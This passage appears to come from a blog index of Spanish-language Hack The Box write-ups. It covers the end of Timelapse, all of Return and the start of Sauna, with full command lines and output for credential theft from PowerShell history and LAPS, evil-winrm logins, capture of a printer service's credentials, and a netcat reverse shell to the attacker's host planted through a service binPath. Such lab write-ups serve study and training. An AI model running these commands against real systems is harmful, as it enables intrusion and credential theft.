PUBLIC_KEY_PATH    Local path to public key certificate    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificateHaciendo uso de estas flags podemos entrar, sin embargo, hay un detalle, dentro de la captura de nmap podemos observar que el puerto 5986 está abierto pero por ssl:5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)Por lo tanto, tenemos que utilizar la flag -S para realizar la conexión por ssl:evil-winrm -i 10.10.11.152 -c certificate.pem -k privkey -SEvil-WinRM shell v3.4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completionWarning: SSL enabledInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; whoamitimelapse\\legacyyHemos ingresado correctamente a la máquina, ahora buscamos la flag del usuario en su directorio personal:*Evil-WinRM* PS C:\\Users\\legacyy\\Desktop&gt; type user.txtf0077300e68b7b8434828¡Bien! ahora solo falta encontrar la forma de convertirnos en administradores.Escalada de privilegiosAhora que estamos en la máquina buscaremos si tenemos algún privilegio especial:C:\\Users\\legacyy&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name                Description                    State============================= ============================== =======SeMachineAccountPrivilege     Add workstations to domain     EnabledSeChangeNotifyPrivilege       Bypass traverse checking       EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledSin embargo, no tenemos. Veremos los grupos:*Evil-WinRM* PS C:\\Users\\legacyy&gt; net user legacyyUser name                    legacyyFull Name                    LegacyyCommentUser's commentCountry/region code          000 (System Default)Account active               YesAccount expires              NeverPassword last set            10/23/2021 11:17:10 AMPassword expires             NeverPassword changeable          10/24/2021 11:17:10 AMPassword required            YesUser may change password     YesWorkstations allowed         AllLogon scriptUser profileHome directoryLast logon                   2/8/2023 7:02:50 AMLogon hours allowed          AllLocal Group Memberships      *Remote Management UseGlobal Group memberships     *Domain Users         *DevelopmentPero no vamos nada interesante además de Remote Management use, ahora vamos a enumerar los usuarios del sistema::\\Users\\legacyy&gt; net userUser accounts for \\\\-------------------------------------------------------------------------------Administrator            babywyrm                 Guestkrbtgt                   legacyy                  payl0adsinfulz                  svc_deploy               thecybergeekTRXLuego de revisar todos los usuarios, uno en particular pertenece a un grupo especial:*Evil-WinRM* PS C:\\Users\\legacyy&gt; net user svc_deployUser name                    svc_deployFull Name                    svc_deployCommentUser's commentCountry/region code          000 (System Default)Account active               YesAccount expires              NeverPassword last set            10/25/2021 11:12:37 AMPassword expires             NeverPassword changeable          10/26/2021 11:12:37 AMPassword required            YesUser may change password     YesWorkstations allowed         AllLogon scriptUser profileHome directoryLast logon                   10/25/2021 11:25:53 AMLogon hours allowed          AllLocal Group Memberships      *Remote Management UseGlobal Group memberships     *LAPS_Readers         *Domain UsersThe command completed successfully.Pertenece al grupo LAPS_Readers, por lo tanto, necesitamos convertirnos en ese usuario.Buscando vias potenciales, antes de utilizar herramientas como winPEAS y BloodHound, veremos si existe información en el historial de powershell:*Evil-WinRM* PS C:\\Users\\legacyy&gt;  type AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txtwhoamiipconfig /allnetstat -ano |select-string LIST$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}get-aduser -filter * -properties *exitSi existe información, podemos observar una clave y nombre de usuario, svc_deploy. Haciendo uso de crackmapexec verificamos si las credenciales son correctas:crackmapexec smb 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)SMB         10.10.11.152    445    DC01             [+] timelapse.htb\\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV La contraseña es correcta, por lo tanto, utilizaremos el propio crackmapexec para leer las contraseñas de LAPS, debido a que el usuario pertenece al grupo LAPS_Readers:crackmapexec ldap 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' –kdcHost 10.10.11.152 -M lapsSMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)LDAP        10.10.11.152    389    DC01             [+] timelapse.htb\\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV LAPS        10.10.11.152    389    DC01             [*] Getting LAPS PasswordsLAPS        10.10.11.152    389    DC01             Computer: DC01$                Password: k./#7,%N)Jz(s;RI)7JPOHDSObservamos que tenemos la contraseña, esta corresponde a la de administrador de dominio, pues LAPS sirve para eso, por lo tanto, vamos a verificar con crackmapexec si es correcto:crackmapexec smb 10.10.11.152 -u 'Administrator' -p 'k./#7,%N)Jz(s;RI)7JPOHDS'SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)SMB         10.10.11.152    445    DC01             [+] timelapse.htb\\Administrator:k./#7,%N)Jz(s;RI)7JPOHDS (Pwn3d!)Si, asi que utilizando evil-winrm entramos:evil-winrm -i 10.10.11.152 -u 'Administrator' -p 'k./#7,%N)Jz(s;RI)7JPOHDS' -SEvil-WinRM shell v3.4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completionWarning: SSL enabledInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoamitimelapse\\administrator*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; Ahora solo debemos encontrar la flag de administrador, sin embargo, no se encuentra en su directorio, pero existe un usuario que también es administrador:C:\\Users&gt; net user TRXUser name                    TRXFull Name                    TRXCommentUser's commentCountry/region code          000 (System Default)Account active               YesAccount expires              NeverPassword last set            2/23/2022 5:43:45 PMPassword expires             NeverPassword changeable          2/24/2022 5:43:45 PMPassword required            YesUser may change password     YesWorkstations allowed         AllLogon scriptUser profileHome directoryLast logon                   2/8/2023 5:42:02 AMLogon hours allowed          AllLocal Group MembershipsGlobal Group memberships     *Domain Users         *Domain AdminsThe command completed successfully.Por lo que iremos a su directorio a buscar:*Evil-WinRM* PS C:\\Users\\TRX\\Desktop&gt; type root.txtfd8604a9df69fc948356!Listo!Hemos vulnerado completamente la máquina hasta ser administradores.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "Return HTB Write-up",
    "url": "/posts/Return/",
    "categories": "Write up, Hack The Box",
    "tags": "Enumeration, Printer, Server Operators Abuse, Windows, Easy",
    "date": "2023-02-08 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Return, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Return, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del sistema.  Vulnerar web de impresora.  Utilización de burpsuite.  Abuso de grupo Server Operators para escalar privilegios.Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando ping:ping -c 1 10.10.11.108PING 10.10.11.108 (10.10.11.108) 56(84) bytes of data.64 bytes from 10.10.11.108: icmp_seq=1 ttl=127 time=136 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro -sS el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):sudo nmap --open -sS -p- -min-rate 5000 -n -Pn 10.10.11.108 -oG portsAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT      STATE SERVICE53/tcp    open  domain80/tcp    open  http88/tcp    open  kerberos-sec135/tcp   open  msrpc139/tcp   open  netbios-ssn389/tcp   open  ldap445/tcp   open  microsoft-ds464/tcp   open  kpasswd5593/tcp   open  http-rpc-epmap636/tcp   open  ldapssl3268/tcp  open  globalcatLDAP3269/tcp  open  globalcatLDAPssl5985/tcp  open  wsman9389/tcp  open  adws47001/tcp open  winrm49664/tcp open  unknown49665/tcp open  unknown49666/tcp open  unknown49667/tcp open  unknown49671/tcp open  unknown49674/tcp open  unknown49675/tcp open  unknown49679/tcp open  unknown49682/tcp open  unknown49694/tcp open  unknown60360/tcp open  unknown¡Los puertos expuestos de la máquina nos hacen pensar que se trata de un directorio activo, sin embargo, realizamos un escaneo de los servicios expuestos utilizando nmap:sudo nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49694 10.10.11.108 -oN ServiceScanComo resultado del escaneo tenemos:PORT      STATE SERVICE       VERSION53/tcp    open  domain        Simple DNS Plus80/tcp    open  http          Microsoft IIS httpd 10.0|_http-title: HTB Printer Admin Panel|_http-server-header: Microsoft-IIS/10.0| http-methods: |_  Potentially risky methods: TRACE88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-09 05:27:00Z)135/tcp   open  msrpc         Microsoft Windows RPC139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)445/tcp   open  microsoft-ds?464/tcp   open  kpasswd5?593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp   open  tcpwrapped3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)3269/tcp  open  tcpwrapped5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.09389/tcp  open  mc-nmf        .NET Message Framing47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open  msrpc         Microsoft Windows RPC49665/tcp open  msrpc         Microsoft Windows RPC49666/tcp open  msrpc         Microsoft Windows RPC49667/tcp open  msrpc         Microsoft Windows RPC49671/tcp open  msrpc         Microsoft Windows RPC49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.049675/tcp open  msrpc         Microsoft Windows RPC49679/tcp open  msrpc         Microsoft Windows RPC49682/tcp open  msrpc         Microsoft Windows RPC49694/tcp open  msrpc         Microsoft Windows RPCService Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: |   311: |_    Message signing enabled and required|_clock-skew: 18m35s| smb2-time: |   date: 2023-02-09T05:28:01|_  start_date: N/AEfectivamente, estamos frente a un directorio activo. En primer lugar, se observa el puerto 445 abierto, el cual corresponde al servicio smb, por lo tanto, intentaremos realizar una enumeración del equipo y también si es posible de usuarios o recursos, para ello usaremos diferentes herramientas, la primera es crackmapexec:crackmapexec smb 10.10.11.108SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)Se puede observar que el dominio es return.local, por lo tanto, abrimos el /etc/hosts e ingresamos dicho nombre de dominio:127.0.0.1       localhost127.0.1.1       kali::1             localhost ip6-localhost ip6-loopbackff02::1         ip6-allnodesff02::2         ip6-allrouters10.10.11.108    return.localPara de esta manera tener conectividad, para comprobarlo utilizamos ping:ping -c 1 return.localPING return.local (10.10.11.108) 56(84) bytes of data.64 bytes from return.local (10.10.11.108): icmp_seq=1 ttl=127 time=134 msLuego de comprobar lo anterior, probamos si se pueden listar archivos compartidos en la red, con la herramienta crackmapexec:crackmapexec smb 10.10.11.108 --sharesSMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)SMB         10.10.11.108    445    PRINTER          [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)Sin embargo, no fue posible. Para seguir la enumeración utilizamos smbmap:smbmap -H 10.10.11.108[+] IP: 10.10.11.108:445        Name: return.local  No tenemos capacidad de lectura de ningún recurso, por lo que no podemos seguir enumerando por smb.Revisando los puertos vemos que está el 80 abierto, por lo tanto, vamos a utilizar la herramienta whatweb para ver qué información nos ofrece:whatweb 10.10.11.108http://10.10.11.108 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.108], Microsoft-IIS[10.0], PHP[7.4.13], Script, Title[HTB Printer Admin Panel], X-Powered-By[PHP/7.4.13]Como podemos observar, corresponde a un IIS. Vamos al navegador para ver de qué se trata:Vemos una impresora, al parecer corresponde a la página de una impresora. Si recorremos vemos la sección settings:ExplotaciónPodemos observar que existe un panel, en el cual se puede poner información. Además, existe una sección de contraseña, si vamos a inspeccionar elemento podremos ver que corresponde a text, por lo tanto, no es una contraseña sino asteríscos.En este punto utilizaremos burpsuite para interceptar la petición:Obsevarmos que la única información que se envía por POST es la del servidor, por lo tanto, debe estar intentando conectarse a esa IP. Para comprobar si esto de verdad ocurre o es simplemente una página inútil vamos a ingresar nuestra ip, además estaremos escuchando por el puerto 389 como dice en la página:Al momento de enviar la petición podemos ver que nos llega una conexión en netcat:nc -nvlp 389listening on [any] 389 ...connect to [10.10.14.17] from (UNKNOWN) [10.10.11.108] 620900*`%return\\svc-printer�                       1edFg43012!!Obtenemos unos números extraños, puede ser que sean una contraseña. Para verificar si esto es correcto utilizaremos crackmapexec:crackmapexec smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)SMB         10.10.11.108    445    PRINTER          [+] return.local\\svc-printer:1edFg43012!! Bien, corresponde a un usuario válido. Como está el puerto de winrm abierto intentaremos ver si este usuario pertenece al grupo Remote Management use utilizando crackmapexec:crackmapexec winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'SMB         10.10.11.108    5985   PRINTER          [*] Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local)HTTP        10.10.11.108    5985   PRINTER          [*] http://10.10.11.108:5985/wsmanWINRM       10.10.11.108    5985   PRINTER          [+] return.local\\svc-printer:1edFg43012!! (Pwn3d!)Observamos que si está en el grupo, por lo tanto, utilizando evil-winrm nos conectaremos a la máquina:evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'Evil-WinRM shell v3.4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&gt; whoamireturn\\svc-printerAhora buscaremos la flag dentro del directorio personal del usuairo svc-printer:*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; dir    Directory: C:\\Users\\svc-printer\\DesktopMode                LastWriteTime         Length Name----                -------------         ------ -----ar---         2/8/2023   8:29 PM             34 user.txt*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; type user.txta91d927f0709257aa634d1Bien, ahora tenemos que encontrar la forma de convertirnos en domain admin.Escalada de privilegiosSi observamos los grupos del usuario tenemos:*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; net user svc-printerUser name                    svc-printerFull Name                    SVCPrinterComment                      Service Account for PrinterUser's commentCountry/region code          000 (System Default)Account active               YesAccount expires              NeverPassword last set            5/26/2021 12:15:13 AMPassword expires             NeverPassword changeable          5/27/2021 12:15:13 AMPassword required            YesUser may change password     YesWorkstations allowed         AllLogon scriptUser profileHome directoryLast logon                   2/8/2023 8:52:40 PMLogon hours allowed          AllLocal Group Memberships      *Print Operators      *Remote Management Use                             *Server OperatorsGlobal Group memberships     *Domain UsersThe command completed successfully.Observamos que pertenecemos al grupo Server Operators, si buscamos por google si existen maneras de escalar privilegios con este grupo encontramos la siguiente web, el primer paso consiste en subir a la máquina víctima el netcat.exe, en este caso este ejecutable en encuentra en:locate nc.exe/home/kali/SecLists/Web-Shells/FuzzDB/nc.exe/usr/share/windows-resources/binaries/nc.exeProdecemos a subirlo a máquina víctima:C:\\Users\\svc-printer&gt; upload /usr/share/windows-resources/binaries/nc.exeInfo: Uploading /usr/share/windows-resources/binaries/nc.exe to C:\\Users\\svc-printer\\nc.exe                                                             Data: 79188 bytes of 79188 bytes copiedInfo: Upload successful!La gracia que tiene todo esto, es que al ser del grupo Server Operators podemos ejecutar y detener servicios, lo que podemos hacer es cambiar el path de un servicio en particular para ejectuar lo que nosotros queramos, en este caso será una conexión por netcat hacia nuestra máquina, estaremos utilizando el servicio VMTools:C:\\Users\\svc-printer&gt; servicesPath                                                                                                                 Privileges Service          ----                                                                                                                 ---------- -------          C:\\Windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             \\??\\C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{5533AFC7-64B3-4F6E-B453-E35320B35716}\\MpKslDrv.sys       True MpKslceeb2796    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\SMSvcHost.exe                                                              True NetTcpPortSharingC:\\Windows\\SysWow64\\perfhost.exe                                                                                           True PerfHost         \"C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe\"                                                False Sense            C:\\Windows\\servicing\\TrustedInstaller.exe                                                                                 False TrustedInstaller \"C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe\"                                                     True VGAuthService    \"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\"                                                                        True VMTools          \"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2104.14-0\\NisSrv.exe\"                                             True WdNisSvc         \"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2104.14-0\\MsMpEng.exe\"                                            True WinDefend        \"C:\\Program Files\\Windows Media Player\\wmpnetwk.exe\"                                                                      False WMPNetworkSvc Ahora, teniendo en nc.exe en la máquina, cambiamos el path del servicio:*Evil-WinRM* PS C:\\Users\\svc-printer&gt; sc.exe config VMTools binPath=\"C:\\Users\\svc-printer\\nc.exe -e cmd.exe 10.10.14.17 1234\"[SC] ChangeServiceConfig SUCCESSLuego, detenemos el servicio de VMTools y lo volvemos a iniciar para que busque el servicio desde el nuevo path y ejecute el netcat:*Evil-WinRM* PS C:\\Users\\svc-printer&gt; sc.exe stop VMTools*Evil-WinRM* PS C:\\Users\\svc-printer&gt; sc.exe start VMToolsEn nuestra máquina recibimos una conexión:nc -nvlp 1234listening on [any] 1234 ...connect to [10.10.14.17] from (UNKNOWN) [10.10.11.108] 65188Microsoft Windows [Version 10.0.17763.107](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoamiwhoamint authority\\systemPodemos notar que somos administrador, ahora buscamos la flag en el directorio personal del administrador:C:\\Users\\Administrator\\Desktop&gt;type root.txttype root.txtc1e9b456ee2a4891a570be¡Bien!Hemos ganado acceso como administrador.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "Sauna HTB Write-up",
    "url": "/posts/Sauna/",
    "categories": "Write up, Hack The Box",
    "tags": "Enumeration, Active Directory, ASRepRoast, WinPEAS, BloodHound, Sharphound, DCSync attack, Pass the hash, Windows, Easy",
    "date": "2023-02-07 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Sauna, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del ...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Sauna, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del sistema, en este caso es de directorio activo (smbmap, smbclient, crackmapexec, LDAP, Kerberos).  Ataque ASRepRoast utilizando GetNPUsers.py.  Enumeración de información con WinPEAS.  Utilización de Bloodhound y Sharphound.exe.  DCSync attack.  Pass the hash.Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando ping:ping -c 1 10.10.10.175PING 10.10.10.175 (10.10.10.175) 56(84) bytes of data.64 bytes from 10.10.10.175: icmp_seq=1 ttl=127 time=138 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro -sS el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):sudo nmap --open -sS -p- -min-rate 5000 -n -Pn 10.10.10.175 -oG portsAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT      STATE SERVICE53/tcp    open  domain80/tcp    open  http88/tcp    open  kerberos-sec135/tcp   open  msrpc139/tcp   open  netbios-ssn389/tcp   open  ldap445/tcp   open  microsoft-ds464/tcp   open  kpasswd5593/tcp   open  http-rpc-epmap636/tcp   open  ldapssl3268/tcp  open  globalcatLDAP3269/tcp  open  globalcatLDAPssl5985/tcp  open  wsman9389/tcp  open  adws49667/tcp open  unknown49673/tcp open  unknown49674/tcp open  unknown49677/tcp open  unknown49689/tcp open  unknown49696/tcp open  unknownLos puertos expuestos de la máquina nos hacen pensar que se trata de un directorio activo, sin embargo, realizamos un escaneo de los servicios expuestos utilizando nmap:sudo nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49677,49689,49696 10.10.10.175 -oN ServiceScanComo resultado del escaneo tenemos:PORT      STATE SERVICE       VERSION53/tcp    open  domain        Simple DNS Plus80/tcp    open  http          Microsoft IIS httpd 10.0|_http-title: Egotistical Bank :: Home| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.088/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-07 10:16:03Z)135/tcp   open  msrpc         Microsoft Windows RPC139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)445/tcp   open  microsoft-ds?464/tcp   open  kpasswd5?593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp   open  tcpwrapped3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)3269/tcp  open  tcpwrapped5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp  open  mc-nmf        .NET Message Framing49667/tcp open  msrpc         Microsoft Windows RPC49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.049674/tcp open  msrpc         Microsoft Windows RPC49677/tcp open  msrpc         Microsoft Windows RPC49689/tcp open  msrpc         Microsoft Windows RPC49696/tcp open  msrpc         Microsoft Windows RPCService Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: |   311: |_    Message signing enabled and required|_clock-skew: 7h00m00s| smb2-time: |   date: 2023-02-07T10:16:56|_  start_date: N/AEfectivamente, estamos frente a un directorio activo. En primer lugar, se observa el puerto 445 abierto, el cual corresponde al servicio smb, por lo tanto, intentaremos realizar una enumeración del equipo y también si es posible de usuarios o recursos, para ello usaremos diferentes herramientas, la primera es crackmapexec:crackmapexec smb 10.10.10.175SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)Se puede observar que es un DC y que el dominio es EGOTISTICAL-BANK.LOCAL, por lo tanto, abrimos el /etc/hosts e ingresamos dicho nombre de dominio:127.0.0.1       localhost127.0.1.1       kali::1             localhost ip6-localhost ip6-loopbackff02::1         ip6-allnodesff02::2         ip6-allrouters10.10.10.175    EGOTISTICAL-BANK.LOCALPara de esta manera tener conectividad, para comprobarlo utilizamos ping:ping -c 1 EGOTISTICAL-BANK.LOCALPING EGOTISTICAL-BANK.LOCAL (10.10.10.175) 56(84) bytes of data.64 bytes from EGOTISTICAL-BANK.LOCAL (10.10.10.175): icmp_seq=1 ttl=127 time=136 msLuego de comprobar lo anterior, probamos si se pueden listar archivos compartidos en la red, con la herramienta crackmapexec:crackmapexec smb 10.10.10.175 --sharesSMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)SMB         10.10.10.175    445    SAUNA            [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)Sin embargo, no fue posible. Para seguir la enumeración utilizamos smbmap:smbmap -H 10.10.10.175[+] IP: 10.10.10.175:445        Name: EGOTISTICAL-BANK.LOCAL No tenemos capacidad de lectura de ningún recurso, por lo que no podemos seguir enumerando por smb.Revisando el archivo de servicios creado por nmap vemos que está el servicio de LDAP, buscando en la web de HackTricks mencionan formas de utilizar LDAP para enumerar información, en este caso usamos ldapsearch:ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts# extended LDIF## LDAPv3# base &lt;&gt; (default) with scope baseObject# filter: (objectclass=*)# requesting: namingcontexts ##dn:namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCALnamingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCALnamingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCALnamingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCALnamingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCALObservamos que existe el context DC=EGOTISTICAL-BANK,DC=LOCAL, filtrando por este nombre buscamos: ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL' Esto arroja mucha información, sin embargo, si nos fijamos en las últimas líneas:# Managed Service Accounts, EGOTISTICAL-BANK.LOCALdn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL# Keys, EGOTISTICAL-BANK.LOCALdn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL# TPM Devices, EGOTISTICAL-BANK.LOCALdn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL# Builtin, EGOTISTICAL-BANK.LOCALdn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL# Hugo Smith, EGOTISTICAL-BANK.LOCALdn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL# search referenceref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST ICAL-BANK,DC=LOCAL# search referenceref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST ICAL-BANK,DC=LOCALEncontramos un posible nombre de usuario, Hugo Smith.Probamos si es que este usuario es válido utilizando kerbrute, ingresamos el nombre Hugo Smith en un archivo de texto llamado names.txt:kerbrute userenum -d 'EGOTISTICAL-BANK.LOCAL' --dc 10.10.10.175 names.txt    __             __               __        / /_____  _____/ /_  _______  __/ /____   / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __//_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        Version: dev (n/a) - 02/06/23 - Ronnie Flathers @ropnop2023/02/06 22:59:23 &gt;  Using KDC(s):2023/02/06 22:59:23 &gt;   10.10.10.175:882023/02/06 22:59:23 &gt;  Done! Tested 1 usernames (0 valid) in 0.176 secondsPero no es válido, sin embargo, se pueden probar variaciones de este nombre como HugoSmith, Hugo.Smith, hugosmith, etc. Dichas combinaciones las agregamos al archivo names.txt.Al ejecutar kerbrute otra vez tenemos:kerbrute userenum -d 'EGOTISTICAL-BANK.LOCAL' --dc 10.10.10.175 names.txt    __             __               __        / /_____  _____/ /_  _______  __/ /____   / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __//_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        Version: dev (n/a) - 02/06/23 - Ronnie Flathers @ropnop2023/02/06 23:02:52 &gt;  Using KDC(s):2023/02/06 23:02:52 &gt;   10.10.10.175:882023/02/06 23:02:52 &gt;  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL2023/02/06 23:02:52 &gt;  Done! Tested 6 usernames (1 valid) in 0.141 secondsObservamos que el nombre hsmith es válido. Sin embargo, no podemos hacer mucho con este nombre, en caso de poder extraer un ticket para poder crackear, kerbrute ya nos lo habría pasado, por lo tanto, buscamos más nombres.Llama la antención que el puerto 80 está abierto, específicamente un IIS, entramos a esta página por el navegador:Si navegamos dentro de la sección About us, en la parte inferior encontramos diversos nombres Fergus Smith, Shaun Coins, Sophie Driver, Bowie Taylor, Hugo Bear, Steven Kerb.Todos estos nombres los ingresamos a la lista names.txt, escritos de la misma forma que hsmith:kerbrute userenum -d 'EGOTISTICAL-BANK.LOCAL' --dc 10.10.10.175 names.txt    __             __               __        / 